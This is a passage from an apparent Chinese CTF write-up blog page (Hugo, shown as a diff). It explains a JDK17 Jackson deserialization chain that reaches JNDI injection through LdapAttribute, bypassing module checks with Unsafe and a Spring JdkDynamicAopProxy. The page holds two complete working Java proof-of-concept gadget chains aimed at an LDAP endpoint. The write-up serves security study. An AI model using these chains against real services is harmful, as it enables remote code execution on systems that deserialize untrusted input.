+import java.net.URL;
+import java.util.Base64;
+import java.util.Vector;
+import Utils.Util;
+
+//import static org.example.Main.deserial;
+//import static org.example.Main.serial;
+
+public class test {
+    public static void main(String[] args) throws Exception {
+        Class&lt;?&gt; unSafe=Class.forName(&#34;sun.misc.Unsafe&#34;);
+        Field unSafeField=unSafe.getDeclaredField(&#34;theUnsafe&#34;);
+        unSafeField.setAccessible(true);
+        Unsafe unSafeClass= (Unsafe) unSafeField.get(null);
+        //获取基类模块
+        Module baseModule=Object.class.getModule();
+        Class&lt;?&gt; currentClass=test.class;
+        //获取caller类的module field的地址
+        long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(&#34;module&#34;));
+        //直接将基类module的值覆盖在我们的地址上
+        unSafeClass.getAndSetObject(currentClass,addr,baseModule);
+
+        String ldapCtxUrl = &#34;ldap://127.0.0.1:1389/&#34;;
+        Class ldapAttributeClazz = Class.forName(&#34;com.sun.jndi.ldap.LdapAttribute&#34;);
+        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+                new Class[] {String.class});
+        ldapAttributeClazzConstructor.setAccessible(true);
+        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+                new Object[] {&#34;name&#34;});
+        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(&#34;baseCtxURL&#34;);
+        baseCtxUrlField.setAccessible(true);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        Field rdnField = ldapAttributeClazz.getDeclaredField(&#34;rdn&#34;);
+        rdnField.setAccessible(true);
+        rdnField.set(ldapAttribute, new CompositeName(&#34;a//b&#34;));
+
+        POJONode jsonNodes=new POJONode(ldapAttribute);
+
+        EventListenerList list = new EventListenerList();
+        UndoManager manager = new UndoManager();
+        Vector vector = (Vector) getFieldValue(manager, &#34;edits&#34;);
+        vector.add(jsonNodes);
+        setFieldValue(list, &#34;listenerList&#34;, new Object[]{InternalError.class, manager});
+
+        System.out.println(Util.serialize(list));
+        deserialize(serialize(list));
+
+    }
+
+    public static String serialize(Object object) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(object);
+        oos.close();
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+    public static void deserialize(String data) throws Exception {
+
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+    public static void setFieldValue(Object obj, String field, Object arg) throws Exception {
+        Field f = null;
+        Class&lt;?&gt; c = obj.getClass();
+        for (int i = 0; i &lt; 5; i++) {
+            try {
+                f = c.getDeclaredField(field);
+            } catch (NoSuchFieldException e){
+                c = c.getSuperclass();
+            }
+        }
+        f.setAccessible(true);
+        f.set(obj, arg);
+    }
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
+        Field field = null;
+        Class c = obj.getClass();
+        for (int i = 0; i &lt; 5; i++) {
+            try {
+                field = c.getDeclaredField(fieldName);
+            } catch (NoSuchFieldException e){
+                c = c.getSuperclass();
+            }
+        }
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+}
+</code></pre><p>在反序列化的时候会触发以下报错</p>
+<pre tabindex="0"><code>Exception in thread &#34;main&#34; java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method &#39;getAttributeSyntaxDefinition&#39; (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not &#34;opens com.sun.jndi.ldap&#34; to unnamed module @19dc67c2
+</code></pre><p>原因是在jackson反序列化的时候触发了一个模块化的机制，jdk17中的jackson在触发getter的时候，都会进行一次build</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022959002.png" alt="image-20250120022959002"></p>
+<p>在build时会对property(调用的目的类和目的方法)是否public进行一次判断，如果非public则会调用setAccessible来进行一次反射调用</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120023103416.png" alt="image-20250120023103416"></p>
+<p>LdapAttribute类为private类</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120023135669.png" alt="image-20250120023135669"></p>
+<p>然后便触发了模块化机制，导致了报错的产生</p>
+<p>比赛的时候脑子宕机了，后面自己思考的时候突然就想到了一个机制：<code>动态代理</code></p>
+<p>在平常的时候，面对jackson反序列化时大家都会在外面套一层<code>JdkDynamicAopProxy</code>的代理，目的是为了保证反序列化时触发getter的稳定性</p>
+<p>在这里，我们的目的不是稳定性，而是通过invoke来绕过jackson反序列化DirContext类时的报错，原理如下</p>
+<ul>
+<li>由于在外面套了一层proxy，那么jackson就只会从动态代理类触发getter</li>
+<li>然后又由<code>JdkDynamicAopProxy</code>动态代理类去触发LdapAttribute的getter,因为proxy类module位于java.base，所以能够访问任意包下的类而不会触发模块化，然后成功触发JNDI注入</li>
+</ul>
+<p>没套proxy时</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022317849.png" alt="image-20250120022317849"></p>
+<p>套了之后</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250120022402175.png" alt="image-20250120022402175"></p>
+<p>然后后面就是常规套路打EL或者是SnakeYaml了，这里不做太多赘述</p>
+<p>POC</p>
+<pre tabindex="0"><code>package org.example;
+
+import cn.hutool.db.ds.DataSourceWrapper;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.node.POJONode;
+import org.apache.commons.jexl3.JexlBuilder;
+import org.apache.commons.jexl3.MapContext;
+import org.h2.jdbcx.JdbcDataSource;
+import org.h2.message.Trace;
+
+import org.springframework.aop.framework.AdvisedSupport;
+import sun.misc.Unsafe;
+
+import javax.naming.CompositeName;
+import javax.naming.directory.Attribute;
+import javax.sql.DataSource;
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.util.Base64;
+import java.util.Vector;
+import Utils.Util;
+
+
+public class test {
+    public static void main(String[] args) throws Exception {
+
+
+        Class&lt;?&gt; unSafe=Class.forName(&#34;sun.misc.Unsafe&#34;);
+        Field unSafeField=unSafe.getDeclaredField(&#34;theUnsafe&#34;);
+        unSafeField.setAccessible(true);
+        Unsafe unSafeClass= (Unsafe) unSafeField.get(null);
+        //获取基类模块
+        Module baseModule=Object.class.getModule();
+        Class&lt;?&gt; currentClass=test.class;
+        //获取caller类的module field的地址
+        long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(&#34;module&#34;));
+        //直接将基类module的值覆盖在我们的地址上
+        unSafeClass.getAndSetObject(currentClass,addr,baseModule);
+
+        String ldapCtxUrl = &#34;ldap://127.0.0.1:1389/&#34;;
+        Class ldapAttributeClazz = Class.forName(&#34;com.sun.jndi.ldap.LdapAttribute&#34;);
+        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+                new Class[] {String.class});
+        ldapAttributeClazzConstructor.setAccessible(true);
+        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+                new Object[] {&#34;name&#34;});
+        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(&#34;baseCtxURL&#34;);
+        baseCtxUrlField.setAccessible(true);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        Field rdnField = ldapAttributeClazz.getDeclaredField(&#34;rdn&#34;);
+        rdnField.setAccessible(true);
+        rdnField.set(ldapAttribute, new CompositeName(&#34;a//b&#34;));
+
+        Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class);
+        System.out.println(Proxy.class.getModule());
+
+        POJONode jsonNodes=new POJONode(ldapAttribute);
+
+        EventListenerList list = new EventListenerList();
+        UndoManager manager = new UndoManager();
+        Vector vector = (Vector) getFieldValue(manager, &#34;edits&#34;);
+        vector.add(jsonNodes);
+        setFieldValue(list, &#34;listenerList&#34;, new Object[]{InternalError.class, manager});
+
+        System.out.println(Util.serialize(list));
+        deserialize(serialize(list));
+
+    }
+    public static Object getProxy(Object obj,Class&lt;?&gt; clazz) throws Exception
+    {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(obj);
+        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
+        return proxy;
+    }
+    public static String serialize(Object object) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(object);
+        oos.close();
+        return Base64.getEncoder().encodeToString(baos.toByteArray());
+    }
+    public static void deserialize(String data) throws Exception {
+
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+    public static void setFieldValue(Object obj, String field, Object arg) throws Exception {
+        Field f = null;
+        Class&lt;?&gt; c = obj.getClass();
+        for (int i = 0; i &lt; 5; i++) {
+            try {
+                f = c.getDeclaredField(field);
+            } catch (NoSuchFieldException e){
+                c = c.getSuperclass();
+            }
+        }
+        f.setAccessible(true);
+        f.set(obj, arg);
+    }
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception{
+        Field field = null;
+        Class c = obj.getClass();
+        for (int i = 0; i &lt; 5; i++) {
+            try {
+                field = c.getDeclaredField(fieldName);
+            } catch (NoSuchFieldException e){
+                c = c.getSuperclass();
+            }
+        }
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+}
+</code></pre><h2 id="最后">最后</h2>
+<p>这题除了上述方法还有很多方法，比如fastjson触发Ldap的getter，然后fastjson和jackson这俩东西也可以触发依赖里的OracleCachedRowSet的getConnection()打jndi，这里放下篇文章里说吧</p>
+
+        </div>
+    </div>
+    <a href="#" id="scrollToTopButton">
+        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
+            p-id="3988" width="48" height="48">
+            <path
+                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
+                p-id="3989" fill="#363636"></path>
+            <path
+                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
+                p-id="3990" fill="#363636"></path>
+        </svg>
+    </a>
+
+<div class="pp-container">
+        <section class="pre-and-post">
+            <div class="has-text-left">
+                
+                <p>Previous post</p>
+                <a href="http://localhost:1313/post/2025suctf/">2025-SUCTF-WP</a>
+                
+            </div>
+            <div class="has-text-right">
+                
+            </div>
+        </section>
+    </div>
+
+</div>
+
+        </main><footer class="footer">
+    <div class="content has-text-centered">
+    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
+        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
+    </span>
+    </div>
+  </footer></body>
+</html>
+
